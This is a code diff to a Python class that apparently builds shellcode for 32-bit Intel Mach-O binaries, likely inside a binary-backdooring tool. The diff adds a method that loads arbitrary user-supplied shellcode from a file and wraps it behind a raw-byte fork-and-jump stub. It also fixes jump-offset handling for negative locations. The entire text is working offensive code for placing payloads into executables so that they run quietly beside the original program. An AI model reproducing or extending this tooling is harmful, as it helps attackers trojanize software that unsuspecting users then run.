@@ -79,7 +79,28 @@ class macho_intel32_shellcode():
 
         self.shellcode1 = ("\xB8\x02\x00\x00\x02\xcd\x80\x85\xd2")
         self.shellcode1 += "\x0f\x84"
-        self.shellcode1 += struct.pack("<I", len(self.shellcode2) + self.jumpLocation)
+        if self.jumpLocation < 0:
+            self.shellcode1 += struct.pack("<I", len(self.shellcode1) + 0xffffffff + self.jumpLocation)
+        else:
+            self.shellcode1 += struct.pack("<I", len(self.shellcode2) + self.jumpLocation)
+
+        self.shellcode = self.shellcode1 + self.shellcode2
+        return (self.shellcode1 + self.shellcode2)
+
+    def user_supplied_shellcode(self):
+        if self.SUPPLIED_SHELLCODE is None:
+            print "[!] User must provide shellcode for this module (-U)"
+            return False
+        else:
+            supplied_shellcode = open(self.SUPPLIED_SHELLCODE, 'r+b').read()
+        self.shellcode2 = supplied_shellcode
+
+        self.shellcode1 = ("\xB8\x02\x00\x00\x02\xcd\x80\x85\xd2")
+        self.shellcode1 += "\x0f\x84"
+        if self.jumpLocation < 0:
+            self.shellcode1 += struct.pack("<I", len(self.shellcode1) + 0xffffffff + self.jumpLocation)
+        else:
+            self.shellcode1 += struct.pack("<I", len(self.shellcode2) + self.jumpLocation)
 
         self.shellcode = self.shellcode1 + self.shellcode2
         return (self.shellcode1 + self.shellcode2)
